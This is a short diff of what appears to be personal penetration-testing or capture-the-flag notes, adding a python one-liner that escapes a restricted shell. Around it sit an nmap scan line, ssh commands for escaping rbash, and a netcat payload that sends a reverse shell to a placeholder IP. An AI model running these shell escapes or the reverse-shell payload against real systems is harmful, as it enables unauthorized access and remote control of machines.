@@ -93,7 +93,8 @@ sudo nmap -p ****  -sV -A 172.16      # investigate the app of ports.
     rbash across
         ssh xx@xxxxx "export TERM=xterm; python -c 'import pty; pty.spawn(\"/bin/bash\")'"
         ssh mindy@172.16.33.35  -t "bash --noprofile"
-
+	#inner
+		python -c 'import os; os.system("/bin/bash");'
 
     exp exploit
         payload = 'nc  IP  2233 -e /bin/bash'
